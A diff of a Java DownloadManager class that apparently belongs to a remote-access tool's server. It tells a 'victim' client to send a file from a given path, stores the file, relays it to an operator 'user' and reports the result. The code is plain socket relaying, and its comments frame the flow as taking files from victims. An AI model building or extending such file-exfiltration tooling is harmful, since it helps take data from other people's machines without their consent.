@@ -32,32 +32,36 @@ public class DownloadManager extends Thread {
         try {
             int port = findFreePort();
             serverSocket = new ServerSocket(port);
-            victim.sendDownloadFile(path, port, user.getLogin());
+            victim.sendStartDownloadFile(path, port, user.getLogin());
 
-            sourceSocket = serverSocket.accept();
+            sourceSocket = serverSocket.accept(); //wait victim
             inputStream = sourceSocket.getInputStream();
             fileOutputStream = new FileOutputStream(Config.DOWNLOAD_PATH + filename);
             byte[] bytes = new byte[8*1024];
             int len;
             while ((len = inputStream.read(bytes)) != -1) {
-                fileOutputStream.write(bytes, 0, len);
+                fileOutputStream.write(bytes, 0, len); //receive file from victim
             }
 
-            targetSocket = serverSocket.accept();
+            user.sendStartDownloadFile(filename, port, victim.getName());
+
+            targetSocket = serverSocket.accept(); //wait user
             outputStream = targetSocket.getOutputStream();
             fileInputStream = new FileInputStream(Config.DOWNLOAD_PATH + filename);
             while ((len = fileInputStream.read(bytes)) != -1) {
-                outputStream.write(bytes, 0, len);
+                outputStream.write(bytes, 0, len); //transfer file to user
             }
 
+            user.sendFinishDownloadFile(filename, "success", victim.getName());
             dispose();
         } catch (IOException e) {
             e.printStackTrace();
+            user.sendFinishDownloadFile(filename, "error", victim.getName());
             dispose();
         }
     }
 
-    public void dispose() {
+    void dispose() {
         try {
             inputStream.close();
             outputStream.close();
